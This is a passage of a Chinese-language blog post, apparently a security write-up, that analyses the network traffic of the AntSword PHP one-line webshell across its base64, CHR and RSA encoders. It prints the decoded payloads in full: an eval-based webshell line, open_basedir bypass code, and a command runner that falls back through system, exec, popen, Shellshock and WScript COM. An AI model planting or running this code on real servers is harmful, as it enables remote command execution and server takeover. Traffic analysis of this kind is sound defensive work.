0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=`
+
+解码得到
+
+```php
+@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.c2a05da4320f";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "86d4c"."36b17";echo @asenc($output);echo "f48b3"."386ca9";}ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}	";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else{$R.="/";}$R.="	";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)?$u["name"]:@get_current_user();$R.=php_uname();$R.="	{$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();
+```
+
+似曾相识的感觉，就是单纯的加了个处理而已，和 Defaut 一样。看看命令执行是什么样子的
+
+```php
+@eval(@base64_decode($_POST['r9bbc0bcf6c32a']));
+```
+
+`r9bbc0bcf6c32a` 解码后得到
+
+```
+@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.373e7";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "ad43b"."33ba47";echo @asenc($output);echo "4def0"."c3dca";}ob_start();try{$p=base64_decode(substr($_POST["y30befcedad20d"],2));$s=base64_decode(substr($_POST["se7f2c27b5c5b7"],2));$envstr=@base64_decode(substr($_POST["b0c12a80e89ad8"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
+",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();
+```
+
+呵！似曾相识燕归来。那往下就没啥好讲的了
+
+## CHR 编码器
+
+得到流量
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-12.png)
+
+一样的套路
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-13.png)
+
+## RSA 编码器
+
+蚁剑支持 RSA 编解码，看一下流量
+
+![](https://img.trtyr.top/images/blog/%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/001%20%E8%9A%81%E5%89%91php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-14.png)
+
+可以看到，这里已经被加密了。不过可惜的是，response 没有被加密。
